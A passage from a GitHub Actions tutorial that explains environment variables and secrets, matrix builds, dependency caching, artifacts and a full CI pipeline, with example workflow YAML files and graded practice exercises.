5. **[Intermediate]** Create a step that uses `github.event.pull_request.number` to print the PR number. Handle both cases: when it's a PR event and when it's a push event (use `if: github.event_name == 'pull_request'`).

6. **[Intermediate]** Use the `runner` context to create OS-specific steps. On Linux, install `jq`. On Windows, install `jq` via chocolatey. On macOS, install via homebrew. Use `if: runner.os == 'Linux'` etc.

7. **[Intermediate]** Create a multi-step job where step 2 fails. Step 3 should print `"Step 2 failed!"` using `if: steps.step2.outcome == 'failure'`. Step 4 should print `"Done"` using `if: always()`.

8. **[Advanced]** Create a workflow that uses the `needs` context to build a deployment summary. Job `build` outputs `image_tag`. Job `test` outputs `test_count`. Job `summarize` (needs both) prints: `"Image: X, Tests: Y, Deploying to: Z"`.

9. **[Advanced]** Create a step that conditionally sets different environment variables based on the triggering event. Use `env` block at step level that evaluates different expressions depending on `github.event_name`. Print all final env vars.

10. **[Production Scenario]** Build a "smart deploy gate" step that only allows deployment when ALL of these are true:
    - Event is `push` or `workflow_dispatch`
    - Branch is `main` OR there's a version tag
    - Actor is NOT `dependabot[bot]`
    - (Simulate) A "staging tests passed" flag is `true` (set via earlier step output)
    Use a complex `if:` expression combining `&&`, `||`, `contains()`, `startsWith()`.

---
---

## TOPIC 2.4 — Environment Variables and Secrets

### 📖 Explanation

#### Environment Variables

Variables can be set at 3 levels:

```yaml
env:
  WORKFLOW_VAR: "available to all jobs"   # Workflow level

jobs:
  build:
    env:
      JOB_VAR: "available to all steps in this job"   # Job level
    steps:
      - name: Step with its own var
        env:
          STEP_VAR: "only in this step"    # Step level
        run: |
          echo "$WORKFLOW_VAR"
          echo "$JOB_VAR"
          echo "$STEP_VAR"
```

**Setting dynamic variables mid-workflow:**
```bash
# Append to $GITHUB_ENV to make available to later steps
echo "VERSION=1.2.3" >> $GITHUB_ENV
echo "DEPLOY_TIME=$(date -u)" >> $GITHUB_ENV
```

**Built-in GitHub env vars:**
```bash
GITHUB_WORKFLOW      # Workflow name
GITHUB_RUN_ID        # Unique run ID
GITHUB_RUN_NUMBER    # Build number
GITHUB_SHA           # Commit SHA
GITHUB_REF           # Branch/tag ref
GITHUB_ACTOR         # Triggering user
GITHUB_REPOSITORY    # owner/repo
GITHUB_WORKSPACE     # Working directory path
RUNNER_OS            # Linux, Windows, macOS
```

#### Secrets

Secrets are **encrypted values** stored in GitHub. They are NEVER logged.

**Types:**
| Scope | Set at | Access |
|-------|--------|--------|
| Repository | Settings > Secrets | All workflows in that repo |
| Environment | Settings > Environments | Only jobs in that environment |
| Organization | Org Settings > Secrets | All repos in org |

```yaml
steps:
  - name: Use secret
    env:
      API_KEY: ${{ secrets.API_KEY }}         # Reference secret
      DB_PASS: ${{ secrets.DATABASE_PASSWORD }}
    run: |
      echo "Connecting to DB..."
      # $DB_PASS is available but NEVER printed by GitHub

  - name: Pass secret to action
    uses: some/action@v1
    with:
      token: ${{ secrets.GITHUB_TOKEN }}      # Auto-provided
      api-key: ${{ secrets.MY_API_KEY }}
```

**GITHUB_TOKEN** — Automatically created for every workflow run:
```yaml
# Use GITHUB_TOKEN to comment on PRs, create releases, etc.
- name: Comment on PR
  uses: actions/github-script@v7
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    script: |
      github.rest.issues.createComment({
        issue_number: context.issue.number,
        owner: context.repo.owner,
        repo: context.repo.repo,
        body: '✅ All checks passed!'
      })
```

**Security Best Practices:**
```yaml
# ❌ NEVER do this — secret in plain env var exposed in logs
- run: echo "My secret is ${{ secrets.API_KEY }}"

# ❌ NEVER put secrets in workflow env directly
env:
  SECRET: my-actual-secret-value    # BAD

# ✅ DO this — pass to step-level env
- name: Use secret safely
  env:
    TOKEN: ${{ secrets.API_KEY }}
  run: curl -H "Authorization: Bearer $TOKEN" https://api.example.com

# ✅ Mask custom values
- name: Mask dynamic secret
  run: |
    MY_SECRET=$(./get-secret.sh)
    echo "::add-mask::$MY_SECRET"    # Masks value in all future logs
    echo "SECRET=$MY_SECRET" >> $GITHUB_ENV
```

---

### ✅ EXAMPLE 2.4 — Secrets and Variables in Production

```yaml
# .github/workflows/secrets-demo.yml

name: Secrets and Variables Demo

on:
  push:
    branches: [main]

env:
  APP_NAME: myapp
  NODE_ENV: production

jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    environment: production     # Uses environment-scoped secrets

    steps:
      - uses: actions/checkout@v4

      - name: Print non-sensitive env vars
        run: |
          echo "App: $APP_NAME"
          echo "Env: $NODE_ENV"
          echo "Actor: ${{ github.actor }}"
          echo "Run #: ${{ github.run_number }}"

      - name: Generate dynamic build version
        run: |
          BUILD_VERSION="${{ env.APP_NAME }}-${{ github.run_number }}-${{ github.sha }}"
          echo "BUILD_VERSION=$BUILD_VERSION" >> $GITHUB_ENV

      - name: Use the dynamic variable
        run: echo "Building version: $BUILD_VERSION"

      - name: Authenticate (safe secret usage)
        env:
          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
          DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
        run: |
          echo "$DOCKER_PASSWORD" | docker login \
            --username "$DOCKER_USERNAME" \
            --password-stdin
          echo "✅ Docker login successful"

      - name: Deploy with API key
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_API_KEY }}
        run: |
          echo "Making deploy API call..."
          # curl -H "X-API-Key: $DEPLOY_KEY" https://deploy.example.com/trigger
          echo "Deploy triggered for: $BUILD_VERSION"

      - name: Create release artifact
        uses: actions/github-script@v7
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            console.log('Using auto-provided GITHUB_TOKEN');
            const sha = context.sha.substring(0, 7);
            console.log(`Build SHA: ${sha}`);
```

---

### 🏋️ PRACTICE SET 2.4 — 10 Questions

1. **[Beginner]** Create a workflow with variables at workflow, job, and step level, all with the same name `MY_VAR`. Print `MY_VAR` at each level to see which value wins (step overrides job overrides workflow).

2. **[Beginner]** Use `$GITHUB_ENV` to set a variable `BUILD_ID` by combining `github.run_number` and the first 7 chars of `github.sha`. Print it in the next step to confirm it's available.

3. **[Beginner]** Create a workflow that references `secrets.GITHUB_TOKEN` and uses it to fetch the repo's info via GitHub API with `curl -H "Authorization: Bearer $TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY`.

4. **[Intermediate]** Create a workflow with a step that uses `echo "::add-mask::MySecretValue123"` to mask a string. Then attempt to print `MySecretValue123` in a subsequent step. Observe it being masked as `***`.

5. **[Intermediate]** Create a multi-environment workflow: one job runs in `staging` environment, another in `production`. Each environment has different secrets (`DEPLOY_URL`). Print which URL each environment uses. (You'll need to set up environments in repo Settings first.)

6. **[Intermediate]** Create a step that generates a random password (`openssl rand -base64 12`), masks it using `::add-mask::`, stores it in `$GITHUB_ENV`, and uses it in a later step.

7. **[Intermediate]** Create a workflow that passes `GITHUB_TOKEN` to `actions/github-script` and uses it to:
   - Get the PR title (if event is pull_request)
   - Print the PR author
   - Print the number of files changed

8. **[Advanced]** Create a workflow that reads multiple secrets and constructs a database connection string: `postgresql://$DB_USER:$DB_PASS@$DB_HOST:5432/$DB_NAME`. Mask the full connection string immediately after constructing it.

9. **[Advanced]** Demonstrate secret scoping: create a workflow where Job A tries to access an environment-scoped secret (from `production` environment) WITHOUT declaring `environment: production`. Observe it returns empty. Then fix it by adding the environment declaration.

10. **[Production Scenario]** Build a complete secret management pattern:
    - Repository-level: `SLACK_WEBHOOK_URL`, `SONAR_TOKEN`
    - Environment `staging`: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` pointing to staging account
    - Environment `production`: Same secret names pointing to production account
    - Create a workflow that deploys to staging on `develop` push, production on `main` push, using the correct AWS credentials automatically by switching environments.

---
---

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DAY 3 — POWER FEATURES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

---

## TOPIC 3.1 — Matrix Builds

### 📖 Explanation

Matrix builds let you run the **same job** multiple times with **different configurations** — in parallel. This is essential for cross-platform testing, multi-version testing, and multi-environment deploys.

```yaml
jobs:
  test:
    strategy:
      matrix:
        # Cartesian product: 3 × 2 = 6 jobs run in parallel
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [18, 20, 22]
      
      fail-fast: false          # Don't cancel all if one fails
      max-parallel: 4           # Limit concurrent jobs
    
    runs-on: ${{ matrix.os }}
    
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: node --version
```

**include** — Add variables or extra combinations:
```yaml
matrix:
  os: [ubuntu-latest, windows-latest]
  node: [18, 20]
  include:
    # Add extra variable to matching entry
    - os: ubuntu-latest
      extra: "linux-specific-flag"
    # Add a brand new combination (not in the base grid)
    - os: macos-latest
      node: 20
      extra: "mac-only"
```

**exclude** — Remove specific combinations:
```yaml
matrix:
  os: [ubuntu-latest, windows-latest, macos-latest]
  node: [18, 20]
  exclude:
    - os: windows-latest
      node: 18       # Skip Windows + Node 18
```

**Dynamic matrix** — Generate matrix from a step:
```yaml
jobs:
  generate:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          MATRIX='{"include":[{"service":"api"},{"service":"web"},{"service":"worker"}]}'
          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT

  build:
    needs: generate
    strategy:
      matrix: ${{ fromJSON(needs.generate.outputs.matrix) }}
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building ${{ matrix.service }}"
```

---

### ✅ EXAMPLE 3.1 — Complete Matrix Strategy

```yaml
# .github/workflows/matrix-complete.yml

name: Matrix Build and Test

on: [push]

jobs:
  test:
    name: Test ${{ matrix.service }} (Node ${{ matrix.node }} / ${{ matrix.os }})
    
    strategy:
      fail-fast: false
      max-parallel: 6
      matrix:
        os: [ubuntu-latest, macos-latest]
        node: [18, 20]
        service: [api, web]
        exclude:
          - os: macos-latest
            node: 18          # Skip mac + Node 18
        include:
          - os: ubuntu-latest
            node: 20
            service: api
            run_integration: true    # Extra flag for specific combo
    
    runs-on: ${{ matrix.os }}
    
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js ${{ matrix.node }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}

      - name: Show matrix info
        run: |
          echo "Service: ${{ matrix.service }}"
          echo "OS: ${{ matrix.os }}"
          echo "Node: ${{ matrix.node }}"
          echo "Run Integration: ${{ matrix.run_integration }}"
          node --version

      - name: Run unit tests
        run: echo "Running unit tests for ${{ matrix.service }}..."

      - name: Run integration tests
        if: matrix.run_integration == true
        run: echo "Running integration tests (only on ubuntu+Node20+api)!"

  report:
    needs: test
    runs-on: ubuntu-latest
    if: always()
    steps:
      - name: Matrix summary
        run: |
          echo "All matrix jobs done"
          echo "Result: ${{ needs.test.result }}"
```

---

### 🏋️ PRACTICE SET 3.1 — 10 Questions

1. **[Beginner]** Create a matrix job with `python-version: [3.9, 3.10, 3.11, 3.12]` on `ubuntu-latest`. Use `actions/setup-python@v5` to install each version. Print `python --version` in each.

2. **[Beginner]** Create a matrix that tests on `[ubuntu-latest, windows-latest, macos-latest]` with a single Node version (20). For each OS, print the OS-specific temp directory path using `runner.temp`.

3. **[Beginner]** Create a matrix with 3 services: `["auth-service", "payment-service", "notification-service"]`. Each matrix job should simulate building that service: `echo "Building ${{ matrix.service }}"` and `echo "Image: myapp/${{ matrix.service }}:latest"`.

4. **[Intermediate]** Create a matrix with `os` and `node` that produces 6 combinations. Use `exclude` to remove 2 specific combinations. Use `include` to add 1 extra combination with an extra property `experimental: true`. Use `if: matrix.experimental` to run an extra step only for that combination.

5. **[Intermediate]** Implement `max-parallel: 2` on a matrix with 8+ combinations. Observe the queuing behavior. Then remove the limit and observe all running at once.

6. **[Intermediate]** Create a matrix build for a Go project that tests across `go-version: [1.21, 1.22, 1.23]` using `actions/setup-go@v5`. For Go 1.23, add an extra matrix property `benchmark: true` and run benchmark tests only for that version.

7. **[Intermediate]** Build a deployment matrix: deploy to `[dev, staging, production]` environments. Each "environment" in the matrix should print a different deploy URL (`dev.example.com`, `staging.example.com`, `example.com`). Use `matrix.include` to attach the URL to each environment name.

8. **[Advanced]** Generate a **dynamic matrix** from a file. Create `services.json` in your repo: `["api", "frontend", "worker", "scheduler"]`. In job `generate-matrix`, read this file and set it as `$GITHUB_OUTPUT`. Downstream job `build` uses `fromJSON()` to iterate over it.

9. **[Advanced]** Create a matrix where one combination is "experimental" (`fail-fast` would normally kill all if it fails). Use `continue-on-error: ${{ matrix.experimental }}` at the job level to allow that combination to fail without failing the whole workflow.

10. **[Production Scenario]** You maintain a Node.js library that must support Node 16, 18, 20, 22 on Linux and macOS (not Windows). Design a matrix that:
    - Tests all 8 combos (4 versions × 2 OS)
    - Excludes `macos-latest + Node 16` (known issue)
    - On `ubuntu-latest + Node 20` additionally runs: test coverage, audit, and publish-dry-run
    - Sets `fail-fast: false`
    - Posts a Slack notification summary (simulate with `echo`) after all matrix jobs complete

---
---

## TOPIC 3.2 — Caching Dependencies

### 📖 Explanation

Caching saves downloaded packages between workflow runs, making your workflows **2-10x faster**. Without cache: every run downloads npm/pip/maven packages from scratch.

#### Using `actions/cache@v4`

```yaml
- name: Cache node modules
  uses: actions/cache@v4
  with:
    path: ~/.npm                          # What to cache
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |                       # Fallback keys (less specific)
      ${{ runner.os }}-npm-
```

**How caching works:**
1. GitHub checks if cache with exact `key` exists
2. If yes → **cache hit** → restore files (fast!)
3. If no → **cache miss** → download fresh, save at end of job

**Cache Key Strategy:**
- Include `runner.os` — different OS = different cache
- Include `hashFiles(...)` — different lockfile = new dependencies = new cache
- This ensures correctness while maximizing reuse

#### Framework-Specific Patterns

```yaml
# Node.js / npm
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
    restore-keys: ${{ runner.os }}-npm-

# Node.js / yarn
- uses: actions/cache@v4
  with:
    path: ~/.yarn/cache
    key: ${{ runner.os }}-yarn-${{ hashFiles('**/yarn.lock') }}

# Python / pip
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements*.txt') }}

# Python / pipenv
- uses: actions/cache@v4
  with:
    path: ~/.local/share/virtualenvs
    key: ${{ runner.os }}-pipenv-${{ hashFiles('Pipfile.lock') }}

# Java / Maven
- uses: actions/cache@v4
  with:
    path: ~/.m2/repository
    key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}

# Java / Gradle
- uses: actions/cache@v4
  with:
    path: |
      ~/.gradle/caches
      ~/.gradle/wrapper
    key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}

# Docker layers
- uses: actions/cache@v4
  with:
    path: /tmp/.buildx-cache
    key: ${{ runner.os }}-buildx-${{ github.sha }}
    restore-keys: ${{ runner.os }}-buildx-
```

**Built-in caching with setup actions:**
```yaml
# Many setup actions have built-in cache support!
- uses: actions/setup-node@v4
  with:
    node-version: '20'
    cache: 'npm'          # Built-in! No separate cache step needed

- uses: actions/setup-python@v5
  with:
    python-version: '3.12'
    cache: 'pip'

- uses: actions/setup-go@v5
  with:
    go-version: '1.22'
    cache: true
```

**Cache limits:**
- 10 GB per repo
- Entries unused for 7 days are evicted automatically
- Cache is scoped to branch (can read from default branch as fallback)

---

### ✅ EXAMPLE 3.2 — Full Caching Strategy

```yaml
# .github/workflows/caching-demo.yml

name: CI with Caching

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Method 1: Built-in cache via setup action (preferred)
      - name: Setup Node.js with cache
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci                      # ci is faster than install

      # Method 2: Manual cache for build output
      - name: Cache build output
        id: build-cache
        uses: actions/cache@v4
        with:
          path: .next                    # Next.js build output
          key: ${{ runner.os }}-next-${{ hashFiles('src/**', 'package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-next-

      - name: Build (skip if cache hit)
        if: steps.build-cache.outputs.cache-hit != 'true'
        run: |
          npm run build
          echo "Built fresh"

      - name: Using cached build
        if: steps.build-cache.outputs.cache-hit == 'true'
        run: echo "✅ Using cached build output!"

      # Cache Python deps too (multi-language repo)
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
          cache: 'pip'

      - name: Install Python tools
        run: pip install -r requirements-dev.txt

      - name: Run full test suite
        run: |
          npm test
          python -m pytest
```

---

### 🏋️ PRACTICE SET 3.2 — 10 Questions

1. **[Beginner]** Create a workflow that installs Node.js dependencies using `npm ci`. First run WITHOUT cache (measure time in a step using `time npm ci`). Then add `cache: 'npm'` to `actions/setup-node@v4` and compare run times.

2. **[Beginner]** Create a Python workflow that installs dependencies from `requirements.txt` (create one with: `requests`, `pytest`, `black`, `flake8`). Use `actions/setup-python@v5` with `cache: 'pip'`. Verify cache hits on second run.

3. **[Beginner]** Use `actions/cache@v4` manually for Maven dependencies (`~/.m2`). Create a mock Java project with `pom.xml`. Hash `pom.xml` for the cache key.

4. **[Intermediate]** Create a workflow with two jobs that both need `npm install`. Put the cache step in BOTH jobs (GitHub's cache is shared across jobs in a workflow). Verify job 2 benefits from job 1's cache.

5. **[Intermediate]** Implement cache invalidation: create a workflow where the cache key includes a `cache-version` env variable set to `v1`. Simulate a cache bust by changing it to `v2` in the YAML. Verify a new cache is created.

6. **[Intermediate]** Create a workflow with `restore-keys` fallback. Primary key: `ubuntu-npm-${{ hashFiles('package-lock.json') }}`. Restore key: `ubuntu-npm-`. Simulate: modify `package-lock.json` (to miss exact key) and verify the fallback restore key is used.

7. **[Intermediate]** Use `steps.cache-step.outputs.cache-hit` to conditionally skip a step. If cache hit → skip `npm install`, if miss → run it. Print which path was taken.

8. **[Advanced]** Create a Docker BuildKit cache workflow. Use `docker buildx build` with `--cache-from` and `--cache-to` pointing to `type=gha` (GitHub Actions cache). This dramatically speeds up Docker builds.

9. **[Advanced]** Build a Go workflow with module cache (`~/go/pkg/mod`). The cache key should hash all `go.sum` files. If the module cache is invalid, the build should still succeed (graceful fallback). Time the difference between cold and warm cache.

10. **[Production Scenario]** Your CI takes 15 minutes without caching. Design a comprehensive caching strategy for a full-stack app:
    - Frontend: Next.js (Node.js deps + `.next` build cache)
    - Backend: Python FastAPI (pip deps)
    - Docker: Multi-stage Dockerfile (layer caching via BuildKit)
    - Tools: `terraform init` modules (`.terraform` directory)
    Calculate cache keys properly for each and ensure they invalidate when relevant files change.

---
---

## TOPIC 3.3 — Artifacts

### 📖 Explanation

**Artifacts** are files produced by a workflow that you want to:
- Download manually from the GitHub UI
- Pass between jobs in the same workflow
- Store as evidence (test reports, coverage, binaries)

```yaml
# Upload artifact
- name: Upload build artifact
  uses: actions/upload-artifact@v4
  with:
    name: my-build-output            # Artifact name in UI
    path: dist/                      # What to upload
    retention-days: 30               # How long to keep (default: 90)
    if-no-files-found: error         # error | warn | ignore

# Upload multiple paths
- uses: actions/upload-artifact@v4
  with:
    name: test-results
    path: |
      coverage/
      test-results.xml
      screenshots/
```

```yaml
# Download artifact in another job
- name: Download artifact
  uses: actions/download-artifact@v4
  with:
    name: my-build-output            # Same name as upload
    path: downloaded-artifacts/      # Where to put it

# Download all artifacts
- uses: actions/download-artifact@v4
  # No 'name' means download all artifacts
  with:
    path: all-artifacts/
```

**Use Case 1 — Pass build to deploy job:**
```yaml
jobs:
  build:
    steps:
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/

  deploy:
    needs: build
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist
          path: dist/
      - run: rsync dist/ user@server:/var/www/html/
```

**Use Case 2 — Test reports:**
```yaml
- name: Run tests with JUnit output
  run: npm test -- --reporter junit --reporter-options output=test-results.xml

- name: Upload test results
  uses: actions/upload-artifact@v4
  if: always()                       # Upload even if tests fail!
  with:
    name: junit-results
    path: test-results.xml
```

---

### ✅ EXAMPLE 3.3 — Build, Test Reports, and Cross-Job Artifacts

```yaml
# .github/workflows/artifacts-demo.yml

name: Artifacts Pipeline

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build application
        run: |
          mkdir -p dist
          echo "<html><body>Build #${{ github.run_number }}</body></html>" > dist/index.html
          echo "app-version: ${{ github.sha }}" > dist/version.txt
          echo "✅ Build complete"

      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: web-dist
          path: dist/
          retention-days: 7

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run tests and generate report
        run: |
          mkdir -p test-reports
          cat > test-reports/results.xml << 'EOF'
          <?xml version="1.0"?>
          <testsuite tests="10" failures="0" errors="0">
            <testcase name="test_login" time="0.5"/>
            <testcase name="test_payment" time="1.2"/>
          </testsuite>
          EOF
          echo "Tests passed! Report generated."

      - name: Upload test report
        uses: actions/upload-artifact@v4
        if: always()                 # Always upload, even on failure
        with:
          name: test-reports
          path: test-reports/
          retention-days: 30

  deploy:
    needs: [build, test]
    runs-on: ubuntu-latest
    steps:
      - name: Download build artifact
        uses: actions/download-artifact@v4
        with:
          name: web-dist
          path: dist/

      - name: Verify downloaded files
        run: |
          echo "Downloaded files:"
          ls -la dist/
          cat dist/index.html
          cat dist/version.txt

      - name: Deploy
        run: echo "Deploying dist/ to server..."

  summarize:
    needs: [build, test, deploy]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: all-artifacts/

      - name: List all artifacts
        run: find all-artifacts/ -type f | sort
```

---

### 🏋️ PRACTICE SET 3.3 — 10 Questions

1. **[Beginner]** Create a workflow that generates 3 files (`report.txt`, `metrics.json`, `summary.md`) and uploads them all as a single artifact named `reports`. Download them in a second job and print their contents.

2. **[Beginner]** Create a workflow that uploads an artifact with `retention-days: 3`. Then change it to `retention-days: 90`. Verify the UI shows the correct retention period.

3. **[Beginner]** Simulate a failing test scenario: run tests that fail (`exit 1`), but use `if: always()` on the artifact upload to ensure test results are still saved. Verify the artifact appears in the failed run.

4. **[Intermediate]** Create a multi-platform matrix build (ubuntu, macos) that each produce a binary artifact. Use `matrix.os` in the artifact name to avoid collision (e.g., `binary-ubuntu-latest`, `binary-macos-latest`). A final job downloads all and lists them.

5. **[Intermediate]** Build a "build once, deploy many" pattern: one `build` job creates a Docker image tarball (`docker save myapp > myapp.tar`), uploads it as artifact. Two downstream jobs (`deploy-staging`, `deploy-production`) download the same artifact and load it (`docker load < myapp.tar`).

6. **[Intermediate]** Implement test result artifacts with `if-no-files-found: warn`. Intentionally skip creating the test output file in one scenario. Observe the warning vs. the error behavior of `if-no-files-found: error`.

7. **[Intermediate]** Create a workflow that generates a code coverage report (simulate with `echo "Coverage: 87%"` to a file). Upload it, then in a following step use `actions/github-script` to post the coverage number as a PR comment.

8. **[Advanced]** Implement artifact-based deployment versioning: each build uploads a `manifest.json` with `{ "version": "...", "sha": "...", "timestamp": "..." }`. The deploy job downloads it and uses the version to tag the deployment.

9. **[Advanced]** Create a security scanning workflow: run `trivy` (or simulate it) to scan for vulnerabilities, output a SARIF report, upload it as an artifact, and also upload it to GitHub's security tab using `github/codeql-action/upload-sarif@v3`.

10. **[Production Scenario]** Design a complete release pipeline that:
    - Builds binaries for Linux, macOS, Windows (matrix)
    - Uploads each as a separate artifact
    - A `release` job downloads all 3 artifacts
    - Creates a GitHub Release using `actions/github-script`
    - Uploads all 3 binaries as release assets
    - Posts a Slack notification (simulate with echo) with the release URL

---
---

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DAY 4 — CI/CD PIPELINES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

---

## TOPIC 4.1 — Complete CI Pipeline

### 📖 Explanation

A production CI pipeline typically includes these stages:
```
Code Push → Lint → Test → Security Scan → Build → Report
```

Each stage has specific tools and patterns:

```yaml
# Full CI pipeline structure
jobs:
  # Stage 1: Static Analysis
  lint:
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint        # ESLint, Prettier, etc.

  # Stage 2: Testing
  unit-tests:
    needs: lint
    steps:
      - run: npm test

  integration-tests:
    needs: lint
    services:                    # Spin up containers alongside job
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: testdb
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
    steps:
      - run: npm run test:integration

  # Stage 3: Security
  security:
    needs: lint
    steps:
      - uses: actions/checkout@v4
      - run: npm audit --audit-level high

  # Stage 4: Build
  build:
    needs: [unit-tests, integration-tests, security]
    steps:
      - run: npm run build
```

**Services** — Docker containers that run alongside your job:
```yaml
services:
  db:
    image: postgres:16-alpine
    env:
      POSTGRES_USER: myapp
      POSTGRES_PASSWORD: ${{ secrets.DB_PASSWORD }}
      POSTGRES_DB: myapp_test
    ports:
      - 5432:5432                    # host:container
    options: >-
      --health-cmd pg_isready
      --health-interval 10s
      --health-timeout 5s
      --health-retries 5
```

**Connecting to service:** Use `localhost:5432` (the mapped host port).

---

### ✅ EXAMPLE 4.1 — Production Node.js CI Pipeline

```yaml
# .github/workflows/ci.yml

name: CI Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true        # Cancel old runs when new push comes

env:
  NODE_VERSION: '20'
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  lint:
    name: 🔍 Lint & Format Check
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'

      - run: npm ci

      - name: Run ESLint
        run: npm run lint -- --format=github   # GitHub-native format

      - name: Check Prettier
        run: npm run format:check

  unit-test:
    name: 🧪 Unit Tests
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
      - run: npm ci
      - name: Run unit tests with coverage
        run: npm test -- --coverage --coverageReporters=lcov
      - name: Upload coverage
        uses: actions/upload-artifact@v4
        with:
          name: coverage
          path: coverage/

  integration-test:
    name: 🔗 Integration Tests
    runs-on: ubuntu-latest
    needs: lint

    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: testuser
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
      - run: npm ci

      - name: Run database migrations
        env:
          DATABASE_URL: postgresql://testuser:testpass@localhost:5432/testdb
        run: npm run db:migrate

      - name: Run integration tests
        env:
          DATABASE_URL: postgresql://testuser:testpass@localhost:5432/testdb
          REDIS_URL: redis://localhost:6379
        run: npm run test:integration

  security:
    name: 🔒 Security Audit
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
      - run: npm ci
      - name: npm audit
        run: npm audit --audit-level=high
      - name: Dependency review (PRs only)
        if: github.event_name == 'pull_request'
        uses: actions/dependency-review-action@v4

  build:
    name: 🔨 Build & Package
    runs-on: ubuntu-latest
    needs: [unit-test, integration-test, security]
    outputs:
      image_tag: ${{ steps.meta.outputs.tags }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
      - run: npm ci
      - run: npm run build
      - name: Set image metadata
        id: meta
        run: echo "tags=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}" >> $GITHUB_OUTPUT
      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/

  ci-gate:
    name: ✅ CI Gate
    runs-on: ubuntu-latest
    needs: [lint, unit-test, integration-test, security, build]
    if: always()
    steps:
      - name: Check CI result
        run: |
          if [[ "${{ needs.lint.result }}" != "success" ||
                "${{ needs.unit-test.result }}" != "success" ||
                "${{ needs.integration-test.result }}" != "success" ||
                "${{ needs.security.result }}" != "success" ||
                "${{ needs.build.result }}" != "success" ]]; then
            echo "❌ CI FAILED"
            exit 1
          fi
          echo "✅ ALL CI CHECKS PASSED"
```

---

### 🏋️ PRACTICE SET 4.1 — 10 Questions

1. **[Beginner]** Create a CI workflow for a Python FastAPI app: lint with `flake8`, format check with `black --check`, and run tests with `pytest`. Set up a PostgreSQL service for tests.

2. **[Beginner]** Create a Java Maven CI workflow: `mvn compile`, `mvn test`, `mvn package`. Cache `~/.m2`. Upload the JAR file as an artifact.

3. **[Beginner]** Add `concurrency` to a workflow that cancels in-progress runs when a new push happens to the same branch. Test by pushing twice quickly and verifying the first run is cancelled.

4. **[Intermediate]** Create a CI pipeline with a PostgreSQL service. Run a migration script that creates a `users` table. Then run a test that inserts a record and queries it. Use `psql` CLI.

5. **[Intermediate]** Create a CI workflow with a `ci-gate` job that uses `if: always()` and checks all upstream job results. If any job failed, the gate fails. This is useful as a single required status check in GitHub branch protection rules.

